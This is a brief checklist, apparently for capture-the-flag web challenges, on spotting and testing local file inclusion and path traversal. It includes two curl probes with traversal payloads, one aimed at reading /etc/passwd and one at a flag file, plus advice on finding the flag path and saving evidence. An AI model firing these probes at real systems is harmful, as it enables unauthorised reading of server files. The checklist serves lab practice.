# Web: LFI / Path Traversal

## When to Use

Parameters or routes include file paths, downloads, themes, templates, or static file reads.

## Quick Checks

```bash
curl -i "$TARGET/?file=../../../../etc/passwd"
curl -i "$TARGET/?file=../flag"
```

## Next Action

Find path normalization behavior and the real flag path from source or errors.

## Evidence Standard

Save the exact request path and response containing the flag.
